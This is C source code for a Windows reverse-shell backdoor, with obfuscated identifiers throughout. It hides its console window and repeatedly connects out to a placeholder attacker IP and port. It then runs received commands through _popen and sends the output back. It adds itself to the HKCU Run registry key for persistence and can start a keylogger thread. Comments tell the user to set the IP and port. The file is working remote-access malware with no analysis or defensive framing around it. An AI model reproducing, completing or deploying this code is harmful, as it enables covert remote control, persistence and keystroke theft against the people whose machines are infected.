#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <string.h>
#include <windowsx.h>
#include <sys/stat.h>
#include <sys/types.h> 
#include "qfdgdfgfg.h" 

#define ezrtdffnferkjl(p, size) (void) memset((p), 0, (size))

int sock;


int sdflkjdsfkunjesjdfhkeskfjsdfhjk(){
	char sfejhsfjh[128] = "Failed\n";
	char sfngjkjhdjshd[128] = "Succcess At : HKEY_CURRENT_USER\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN\n";
	TCHAR sqdsdjfjshjhdsfjbn[MAX_PATH];
	DWORD sdfjjfsjhjsdhf =0;

	sdfjjfsjhjsdhf = GetModuleFileName(NULL, sqdsdjfjshjhdsfjbn, MAX_PATH);
	if (sdfjjfsjhjsdhf == 0){
		send(sock, sfejhsfjh, sizeof(sfejhsfjh), 0);
		return -1;
	}
	else{
		HKEY dfshjsdhjyhb;

		if( RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &dfshjsdhjyhb) != ERROR_SUCCESS){
			send(sock, sfejhsfjh, sizeof(sfejhsfjh), 0);
			return -1;
		}
		DWORD sdfjjfsjhjsdhfInBytes = sdfjjfsjhjsdhf * sizeof(*sqdsdjfjshjhdsfjbn);
		if(RegSetValueEx(dfshjsdhjyhb, TEXT("test"), 0 , REG_SZ,  (LPBYTE)sqdsdjfjshjhdsfjbn, sdfjjfsjhjsdhfInBytes) != ERROR_SUCCESS){
			RegCloseKey(dfshjsdhjyhb);
			send(sock, sfejhsfjh, sizeof(sfejhsfjh), 0);
			return -1;
		}
		RegCloseKey(dfshjsdhjyhb); 
		send(sock, sfngjkjhdjshd, sizeof(sfngjkjhdjshd), 0);
		return 0;
		
	}
}

char * dsjfhjhfjshjcnuj(char str[], int slice_from, int slice_to){
	if (str[0] = '\0')
		return NULL;
	char *sdqfgqfdsf;
	size_t str_len, sdqfgqfdsf_len;

	if (slice_to <0 && slice_from > slice_to){
		str_len =strlen(str);
		if(abs(slice_from) > str_len -1)
			slice_from = (-1) * str_len;
		sdqfgqfdsf_len = slice_to -slice_from;
		str += (str_len + slice_from);

	}
	else if (slice_from >=0 && slice_to > slice_from){
		str_len = strlen(str);
		if (slice_from > str_len -1)
			return NULL;
		sdqfgqfdsf_len= slice_to - slice_from;
		str += slice_from;
	}
	else
		return NULL;
	sdqfgqfdsf= calloc(sdqfgqfdsf_len, sizeof(char));
	strncpy(sdqfgqfdsf,str,sdqfgqfdsf_len);
	return sdqfgqfdsf;
}

void Shell(){
	char sdqfgqfdsf[1024];
	char sdfgfqsdgvqdsfg[1024];
	char sdfqsdffqsdgvbt[18384];

	
	while(1){
		fsdfqsdvscd:
		ezrtdffnferkjl(sdqfgqfdsf, 1024);
		ezrtdffnferkjl(sdfgfqsdgvqdsfg, 1024);
		ezrtdffnferkjl(sdfqsdffqsdgvbt, sizeof(sdfqsdffqsdgvbt));

		recv(sock,sdqfgqfdsf,1024, 0);

		if (strncmp("q", sdqfgqfdsf, 1) == 0){
			closesocket(sock);
			WSACleanup();
			exit(0);

		}
		else if(strncmp("cd ", sdqfgqfdsf, 3) == 0){
			chdir(dsjfhjhfjshjcnuj(sdqfgqfdsf,3,100));

		}
		else if(strncmp("persist", sdqfgqfdsf,7) ==0){
			sdflkjdsfkunjesjdfhkeskfjsdfhjk();
		}
		else if(strncmp("keylog", sdqfgqfdsf, 6) == 0){
			HANDLE thread = CreateThread(NULL, 0,logg, NULL, 0, NULL); 
			goto fsdfqsdvscd;
		}
		else{
			FILE *fp;
			fp = _popen(sdqfgqfdsf, "r");
			while(fgets(sdfgfqsdgvqdsfg,1024,fp)!=NULL){
				strcat(sdfqsdffqsdgvbt,sdfgfqsdgvqdsfg);
			}
			send(sock, sdfqsdffqsdgvbt, sizeof(sdfqsdffqsdgvbt), 0);
			fclose(fp);
		}	
	}
}
	



int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){ //HINSTANCE --> use this val for win function, hprev --> x64, Cmd line--> command line , cmd show --> rend invisible le prgm
	HWND sqsfsdvfdvffdv;// -----
	AllocConsole();
	sqsfsdvfdvffdv = FindWindowA("ConsoleWindowClass", NULL); //--> permet de caché la console 

	ShowWindow(sqsfsdvfdvffdv,0); // ----

	struct sockaddr_in sqdqsdqcsdgsdgdc;
	unsigned short sdfsdcvsdc;
	char *sdfqsddcs;
	WSADATA dqsfssdcf;

	sdfqsddcs = "$ip"; // ---> chnage ip + port 
	sdfsdcvsdc= $port;

	if(WSAStartup(MAKEWORD(2,0), &dqsfssdcf) != 0){
		exit(1);
	}
	sock = socket(AF_INET, SOCK_STREAM,0);

	memset(&sqdqsdqcsdgsdgdc, 0, sizeof(sqdqsdqcsdgsdgdc));
	sqdqsdqcsdgsdgdc.sin_family = AF_INET;
	sqdqsdqcsdgsdgdc.sin_addr.s_addr =inet_addr(sdfqsddcs);
	sqdqsdqcsdgsdgdc.sin_port = htons(sdfsdcvsdc);


	csdfvqsdvqdsfgvdfdfvcfg:
	while (connect(sock, (struct sockaddr *) &sqdqsdqcsdgsdgdc, sizeof(sqdqsdqcsdgsdgdc)) !=0){
		Sleep(10);
		goto csdfvqsdvqdsfgvdfdfvcfg;
	}
	
	Shell();
}

